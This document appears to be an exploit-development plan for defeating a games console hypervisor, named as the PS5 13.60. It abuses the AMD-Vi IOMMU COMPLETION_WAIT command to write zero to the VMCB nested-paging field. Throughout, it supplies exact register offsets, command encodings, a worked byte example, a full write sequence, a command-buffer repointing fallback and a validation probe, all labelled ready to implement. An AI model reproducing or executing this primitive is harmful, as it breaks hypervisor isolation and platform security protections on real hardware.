# COMPLETION_WAIT_PLAN — AMD-Vi IOMMU write primitive (exact, ready-to-implement)

**Status:** OFFLINE source analysis complete. Every register offset, command encoding,
doorbell semantic, and the store-semantic question are pinned against the FreeBSD AMD-Vi
driver source (`sys/amd64/vmm/amd/amdvi_hw.c` + `amdvi_priv.h`, `main` branch, pulled to
`scratch/amdvi_*.{c,h}`) and cross-checked against `IOMMU_AUDIT.md` / `MMIO_PHYSICAL.md`.

**Objective:** enqueue an AMD-Vi **COMPLETION_WAIT (opcode 0x1)** command that stores the
64-bit value **0** to **VMCB_PA + 0x90** (the `NP_ENABLE` field), so the next `VMRUN` on the
target core runs with nested paging disabled.

**Payload primitive available:** kernel R/W (`kernel_copyout`/`kernel_copyin`/`kernel_set*`).

---

## 0. What is confirmed vs. assumed (read first)

**CONFIRMED from source (no assumptions):**

- Register offsets (`struct amdvi_ctrl`, CTASSERT-anchored): CMDB @ `0x08`, CTRL @ `0x18`,
  CMD head @ `0x2000`, CMD tail @ `0x2008`, Status @ `0x2020`, control-block size `0x4000` (16 KB).
- Command entry is 16 bytes; opcode is **bits [63:60]** (high nibble of the *second* dword);
  the low 3 bits of dword0 are flags **S/I/F**; the store address is **dword0[31:3] + dword1[19:0]**.
- **COMPLETION_WAIT opcode = `0x1`** (`AMDVI_CMP_WAIT_OPCODE`). `0x5` is
  `INVALIDATE_INTERRUPT_TABLE` and **writes nothing** — do not use it.
- FreeBSD builds the entry exactly as (see `amdvi_cmd_cmp()`):
  ```c
  cmd->opcode = 0x1;
  cmd->word0  = (pa & 0xFFFFFFF8) | 0x1;      // S=1
  cmd->word1  = (pa >> 32) & 0xFFFFF;         // addr[51:32]
  cmd->addr   = data;                          // 64-bit store value
  ```
- Doorbell = writing the tail pointer; the increment is
  `MOD_INC(a,s,m) = (a+s) % (m*s)` → `tail = (tail + 16) % (entries * 16)` (byte offset, not index).
- **Store semantics (the (d) question):** the driver's own completion-wait consumer
  (`amdvi_cmp_wait()`) writes a sentinel `VERIFY = 0xA5A5` to a memory location and then
  **polls that location until it reads `0xA5A5` back**. This is proof-positive that with `S=1`
  COMPLETION_WAIT **stores the 64-bit StoreData VALUE to StoreAddress** — it is a full
  arbitrary 8-byte physical write of our chosen value, **not** a "completion flag" write. The
  word "completion" refers only to the command's synchronization behavior (it retires only after
  all prior commands complete); the store is an independent side effect we exploit.

**ASSUMED — must be verified at runtime (each is flagged below):**

1. MMIO reachability: the payload must touch MMIO through the **DMAP alias**
   `0xfffff80000000000 + mmio_pa`, NOT the device-map VA `0xffffec8c01130000` (which
   `kernel_copyout` returns −1 on). `mmio_pa` itself is only a **candidate** (`0xFED80000`);
   the authoritative value is the ECAM BAR read (`0xF00C2010`, device 00:18.2).
2. IOMMU enabled: `CTRL.EN` (bit 0) and `CTRL.CMD` (bit 12) must be set. (Almost certainly set by
   the HV — but verify, don't assume.)
3. Command-buffer PA reachable: the CMDB base PA must be guest-writable (in the DMAP / identity
   RAM). If the HV's buffer sits outside guest-reachable RAM, we must repoint CMDB to a buffer
   we control.
4. **13.60 VMCB_PA is unknown offline** (the historical `0x6290B000`/`0x62A05000` anchors are
   3.00–4.51 values; on 13.60 the HV is a separately-loaded component at a different HPA). The
   store address must be a **host physical address (HPA)**.
5. **window N ↔ core N** is a hypothesis that mostly does not matter (see §4).

---

## 1. Locating the command buffer (a)

Read the **CMDB register (MMIO offset `0x08`, 64-bit)** via the DMAP:

```
cmd_pa  = reg & 0xFFFFFFFFFF000          // base[51:12]  (4-KB-aligned host PA)
len     = (reg >> 56) & 0xF              // log2(entries)
entries = 1 << len
blen    = entries * 16                   // buffer length in bytes (FreeBSD len=8 → 4096)
```

Read the **tail pointer (MMIO offset `0x2008`)** and **head (MMIO offset `0x2000`)**:

```
head = read64(win + 0x2000) & 0x7FFFF    // 19-bit byte offset, HW-owned
tail = read64(win + 0x2008) & 0x7FFFF    // 19-bit byte offset, SW-owned
```

Safety: refuse to proceed if `(tail + 16) % blen == head` (queue full). On an idle queue
`head == tail` is the normal empty state and one free slot always exists.

`ctrl` in `struct amdvi_ctrl` confirms the field packing: `base:40` at bits[51:12] and `len:4` at
bits[59:56]; `cmd_head:19`/`cmd_tail:19` are **byte offsets** (FreeBSD adds `sizeof(struct amdvi_cmd)=16`,
not 1, per entry).

---

## 2. Exact 16-byte COMPLETION_WAIT encoding (b)

Target `T = VMCB_PA + 0x90` (8-byte-aligned: VMCB is page-aligned, 0x90 = 18×8), store value 0.

```
dword0 = (T & 0xFFFFFFF8) | 0x1                     // S=1 (bit0); addr[31:3]
dword1 = 0x10000000 | ((T >> 32) & 0xFFFFF)          // opcode 0x1 @ bits[31:28]; addr[51:32] @ bits[19:0]
dword2 = 0x00000000                                  // store-data low 32
dword3 = 0x00000000                                  // store-data high 32
// little-endian byte order: dword0[0..3] dword1[0..3] dword2[0..3] dword3[0..3]
```

Flags in `dword0[2:0]`: `S`(bit0)=store, `I`(bit1)=completion interrupt, `F`(bit2)=flush.
We set **S=1, I=0, F=0** (matches the known-good `hv_defeat` method and FreeBSD `amdvi_cmd_cmp`).
(Optional: `F=1` forces wait-for-writeback of prior commands; not needed for a single isolated write.)

**Worked example** — historical anchor `VMCB_PA = 0x6290B000` → `T = 0x6290B090`:

```
dword0 = 0x6290B091     dword1 = 0x10000000     dword2 = 0     dword3 = 0
bytes  = 91 B0 90 62 | 00 00 00 10 | 00 00 00 00 | 00 00 00 00
```

---

## 3. Doorbell + window selection (c)

**Window:** `win[N].mmio_pa = mmio_pa0 + N*0x4000` (16-KB stride; N = 0..7 per the task, though
`MMIO_PHYSICAL.md` observes up to 10 windows N=0..9 — read the actual count from the BAR-adjacent
cluster). Reach each window via `DMAP_BASE + win.mmio_pa`.

**Doorbell (the actual trigger):**

```
write64(DMAP_BASE + win.mmio_pa + 0x2008, (tail + 16) % blen)    // byte offset
```

Writing the tail pointer **is** the doorbell — there is no separate doorbell register on AMD-Vi;
the write tells the IOMMU to fetch/execute newly posted commands.

**Per-core window selection — the honest picture:** because the COMPLETION_WAIT StoreAddress is an
**absolute HPA**, the window you enqueue on does **not** determine *which* VMCB gets zeroed — the
address already encodes the target core (`VMCB_PA = VMCB_base + core*0x3000`). The window only
determines *which IOMMU engine* executes the command. Therefore: pick **any** window whose
`CTRL.EN` and `CTRL.CMD` are set and whose CMDB is guest-reachable. The "window N ↔ core N"
mapping only becomes relevant if you observe that a given engine's command buffer is not reachable
or that some engines write into a different physical domain (both would show up as a failed
sentinel probe). Treat N↔core as **unverified and not required** for the write itself; it is only
needed if you later want to guarantee *which engine* performs the write (e.g. for TLB-timing).

---

## 4. Full write sequence (executable)

```
# ---- constants (runtime-resolved) ----
MMIO_PA0  = <from ECAM BAR0 read @ 0xF00C2010, else IVHD BaseAddress, else candidate 0xFED80000>
DMAP      = 0xfffff80000000000
VMCB_PA   = <13.60 host-physical VMCB base for the target core>   # §0 assumption 4
CORE      = c
TARGET    = VMCB_PA + 0x90

win   = MMIO_PA0 + c*0x4000                 # any enabled window works; c is a convenience
base  = DMAP + win

# 1. verify IOMMU is armed
ctrl  = read64(base + 0x18)
assert (ctrl & 0x1) && (ctrl & (1<<12))     # EN bit0, CMD bit12

# 2. locate + gate the command buffer
cmdb  = read64(base + 0x08)
cmd_pa = cmdb & 0xFFFFFFFFFF000
len    = (cmdb >> 56) & 0xF
blen   = (1 << len) * 16
head   = read64(base + 0x2000) & 0x7FFFF
tail   = read64(base + 0x2008) & 0x7FFFF
assert (tail + 16) % blen != head           # one free slot
# if cmd_pa is NOT guest-writable (DMAP read returns -1 / outside RAM):
#   repoint CMDB: write64(base+0x08, our_pa | (len<<56)); write64(base+0x2000,0);
#   write64(base+0x2008,0); tail=head=0; blen = (1<<len)*16  (our_pa = 4-KB-aligned buffer we own)

# 3. write the 16-byte entry at tail
entry = { (TARGET & 0xFFFFFFF8)|1, 0x10000000|((TARGET>>32)&0xFFFFF), 0, 0 }   # LE dwords
write16(DMAP + cmd_pa + tail, entry)        # kernel_copyin / kernel_set* to the buffer PA

# 4. ring the doorbell
write64(base + 0x2008, (tail + 16) % blen)

# 5. wait for completion (any of): poll Status.CMP (bit2 @ 0x2020); or, safest, sentinel-read the
#    TARGET via whatever alias reaches that HPA; or fixed short delay. Then:

# 6. force VMCB reload on the target core so the cleared NP_ENABLE takes effect
vmmcall                                     # on every core, per the public method
```

---

## 5. Correctness / preconditions (d)

- **Is the IOMMU enabled?** Must verify at runtime: `CTRL.EN` (bit 0) = IOMMU enable and
  `CTRL.CMD` (bit 12) = command-buffer enable. If `CMD` is clear the buffer is never serviced; if
  `EN` is clear no commands run. On the PS5 the HV enables the IOMMU (it is central to the
  isolation model), so both are expected set — but read, don't assume. The status register
  `0x2020` bit 2 (`CMP`) is the completion-wait-completed flag.
- **Memory type of the command buffer?** None special. FreeBSD allocates it with plain `M_AMDVI`
  `malloc` (normal cached system RAM) and the on-die AMD-Vi is **coherent** (IVHD `COH` flag
  default 1; `CTRL` bit 10 = coherent). Because the IOMMU snoops the cache-coherent domain, a
  normal kernel store to the buffer is visible to the IOMMU with **no cache flush / write-back**.
  (Only if the unit were non-coherent — `COH` clear — would you need `wbinvd`/`clflush` after the
  entry write and before the doorbell. Flag to check `COH` once.)
- **What does the store do — data value vs. completion flag?** Confirmed above (§0 and source
  `amdvi_cmp_wait`): with `S=1` it performs an **unchecked 8-byte physical write of StoreData**
  (our value `0`) to StoreAddress, executed by the IOMMU engine and **not** subject to CPU/HV
  NPT permission checks — that is precisely why it reaches the HV's carve-out VMCB. It is the
  data value, never a synthesized "completed" flag. The 64-bit width means one command zeroes
  exactly 8 bytes (`VMCB+0x90..0x97`); to zero more, enqueue one COMPLETION_WAIT per 8-byte slot.
- **Store address constraints:** must be 8-byte aligned (bits[2:0] are the flags); `VMCB_PA+0x90`
  always qualifies. Must be a **host physical address**.

---

## 6. Assumptions needing runtime verification (explicit)

| # | assumption | how to verify |
|---|---|---|
| 1 | `mmio_pa0` (candidate `0xFED80000`) | read ECAM BAR0 @ `DMAP+0xF00C2010` (00:18.2); mask `&0xFFFFC000` |
| 2 | MMIO reachable via DMAP (not the `0xffffec8c…` VA) | `kernel_copyout(DMAP+mmio_pa0+0x18, …)` returns 0 and `EN` bit set |
| 3 | `CTRL.EN` and `CTRL.CMD` set | read `0x18`, test bits 0 and 12 |
| 4 | **13.60 VMCB HPA** (biggest unknown) | NPT-alias lane / HV-scan; NOT the 3.00–4.51 anchors |
| 5 | CMDB PA guest-writable; if not, repoint CMDB | read CMDB base via DMAP; if −1, repoint per §4 |
| 6 | IOMMU coherent (`COH`) so no cache flush needed | read `CTRL` bit 10 (or IVHD flag) |
| 7 | window count & N↔core mapping | count contiguous 16-KB windows in the BAR cluster; probe per §7 |
| 8 | store target HPA identity (GPA==HPA for the probe's scratch RAM) | sentinel probe (§7) read-back |

---

## 7. The ONE safe probe that verifies the whole chain

**Before** touching any VMCB, exercise the identical primitive against a **harmless, known-writable
scratch buffer**:

1. Allocate a small scratch buffer in guest RAM; obtain its host-PA (for low guest RAM assume
   GPA==HPA identity; if uncertain, target a PA you can read back through the guest DMAP).
2. Resolve `mmio_pa0` (ECAM BAR) and confirm `CTRL.EN`+`CTRL.CMD`.
3. Build a COMPLETION_WAIT with `StoreAddress = scratch_hpa`, `StoreData = 0xDEADBEEFCAFEBABE`.
4. Write the 16-byte entry at `tail`, write `tail+16 (mod blen)` to `0x2008`.
5. Read `scratch_hpa` back from the guest; assert it equals `0xDEADBEEFCAFEBABE`.

A successful sentinel round-trip proves, in one shot: MMIO PA is correct, the DMAP path reaches it,
CMDB is locatable and writable, the 16-byte encoding is accepted, the doorbell works, and the IOMMU
is enabled and servicing commands — **without any risk to the hypervisor** (worst case is a
sentinel mismatch, i.e. "no write happened"; the console is untouched). Only after this succeeds
do you substitute `StoreAddress = VMCB_PA + 0x90`, `StoreData = 0`, and fire the real write followed
by the `vmmcall`.

---

## 8. Change log
- 2026-10-05: created. Pinned every register offset / entry field / doorbell increment against
  `amdvi_hw.c` + `amdvi_priv.h` (`amdvi_cmd_cmp`, `amdvi_update_cmd_tail`, `MOD_INC`,
  `amdvi_cmp_wait`, `struct amdvi_cmd`, `struct amdvi_ctrl` CTASSERTs). Confirmed COMPLETION_WAIT
  stores the data value (not a flag) from the driver's `VERIFY=0xA5A5` polling pattern. Separated
  confirmed facts from the 8 runtime assumptions; specified the single sentinel probe that
  validates the chain safely before any VMCB write.
